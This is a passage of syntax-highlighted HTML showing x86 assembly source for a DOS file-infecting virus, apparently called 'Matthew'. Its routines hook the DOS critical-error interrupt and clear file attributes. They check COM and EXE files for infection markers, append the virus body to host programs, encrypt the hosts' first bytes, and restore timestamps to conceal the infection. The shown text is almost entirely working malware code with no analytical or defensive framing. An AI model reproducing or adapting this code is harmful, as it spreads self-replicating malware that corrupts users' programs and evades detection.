 </span><span class="sc1">;---------------------------------------- make fresh copy of text</span><span class="sc0">
 </span><span class="sc5">MakeDecryptedCopyOfMessage</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">BootMessage</span><span class="sc4">-</span><span class="sc5">MatthewMessEncrypt</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; set char count</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MatthewMessage</span><span class="sc0">            </span><span class="sc1">; set destination</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MatthewMessEncrypt</span><span class="sc0">        </span><span class="sc1">; set source</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
 </span><span class="sc5">DecryptAndCopy</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                                  </span><span class="sc1">; decrypt...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">                          </span><span class="sc1">; ...and copy</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">DecryptAndCopy</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- write virus code</span><span class="sc0">
 </span><span class="sc5">WriteVirusToFile</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MatthewEntry</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirLenConst</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Handle</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- check disk's free space</span><span class="sc0">
 </span><span class="sc5">CheckDiskSpace</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                     </span><span class="sc1">; error?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">CheckFreeSpace</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
 </span><span class="sc5">NotEnoughSpace</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">CheckFreeSpace</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                     </span><span class="sc1">; enough space?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">EnoughSpace</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VirLenConst</span><span class="sc0">            </span><span class="sc1">; is it enough for me?</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">NotEnoughSpace</span><span class="sc0">
 </span><span class="sc5">EnoughSpace</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- clear buffer for decrypted</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------- for command.com</span><span class="sc0">
 </span><span class="sc5">ClearCommandComBuffer</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc5">ClearLoop</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CommandComBuffer</span><span class="sc4">],</span><span class="sc2">9dh</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">ClearLoop</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Matthew</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Matthew</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- infection routine</span><span class="sc0">
 
 </span><span class="sc5">InfectExecutingProgram</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyPreyNameToAsciiz</span><span class="sc0">      </span><span class="sc1">; copy name of executing program</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ClearCommandComBuffer</span><span class="sc0">     </span><span class="sc1">; clear command.com buffer</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ErrorIntSegment</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">        </span><span class="sc1">; save and hook error handler</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ErrorIntOffset</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">isError</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SetInfect</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Matthew</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
 
 </span><span class="sc5">RestoreErrorInterrupt</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">                  </span><span class="sc1">; restore int 24</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">ErrorIntOffset</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">ErrorIntSegment</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">SetInfect</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckDiskSpace</span><span class="sc0">            </span><span class="sc1">; check if there's enough free space</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RestoreErrorInterrupt</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusAsciiz</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">                    </span><span class="sc1">; get file attribute</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RestoreErrorInterrupt</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Attribute</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">                    </span><span class="sc1">; set file attribute to normal</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RestoreErrorInterrupt</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                  </span><span class="sc1">; open file</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RestoreErrorInterrupt</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Handle</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                  </span><span class="sc1">; save file time and date stamp</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FileDate</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FileTime</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,-</span><span class="sc2">2</span><span class="sc0">                     </span><span class="sc1">; allocate memory for infection</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">EnoughMemory</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RestoreErrorInterrupt</span><span class="sc0">
 </span><span class="sc5">EnoughMemory</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">AllocatedMemory</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; get file length</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Handle</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Relay2</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ComLength</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MovePointerBegin</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Relay2</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ComLength</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">AllocatedMemory</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                    </span><span class="sc1">; read entire com file</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
 </span><span class="sc5">Relay2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">DoneWithFile</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FileTypeFlag</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">        </span><span class="sc1">; is it exe?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay4</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">InfectMark1</span><span class="sc0">                      </span><span class="sc1">; is com infected?</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+(</span><span class="sc5">InfectMark1</span><span class="sc4">-</span><span class="sc5">MatthewEntry</span><span class="sc4">)],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay3</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">InfectMark2</span><span class="sc0">                      </span><span class="sc1">; is it really infected?</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+(</span><span class="sc5">InfectMark2</span><span class="sc4">-</span><span class="sc5">MatthewEntry</span><span class="sc4">)],</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay3</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MovePointerBegin</span><span class="sc0">                    </span><span class="sc1">; move pointer to start</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CheckComLength</span><span class="sc0">
 </span><span class="sc5">Relay3</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoneWithFile</span><span class="sc0">
 </span><span class="sc5">CheckComLength</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ComLength</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VirLenConst</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fde6h</span><span class="sc0">                      </span><span class="sc1">; file too big?</span><span class="sc0">
       </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">Relay3</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteVirusToFile</span><span class="sc0">               </span><span class="sc1">; infect</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Handle</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ComLength</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">AllocatedMemory</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; encrypt first two bytes of </span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">;   host and write it</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoneWithFile</span><span class="sc0">
 
 </span><span class="sc5">Relay4</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">isExe</span><span class="sc0">
 
 </span><span class="sc5">DoneWithFile</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc5">AllocatedMemory</span><span class="sc0">             </span><span class="sc1">; release allocated memory</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Handle</span><span class="sc0">                      </span><span class="sc1">; restore date and time stamp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">FileDate</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">FileTime</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                         </span><span class="sc1">; close file</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusAsciiz</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Attribute</span><span class="sc0">                   </span><span class="sc1">; restore attribute</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">Relay5</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoneWithFile</span><span class="sc0">
 
 </span><span class="sc5">isExe</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">FileTypeFlag</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">AllocatedMemory</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------- check for infection</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">2770h</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">2771h</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">2772h</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">2773h</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">2774h</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">2775h</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">2776h</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">2777h</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">2778h</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">2779h</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">277ah</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">277bh</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
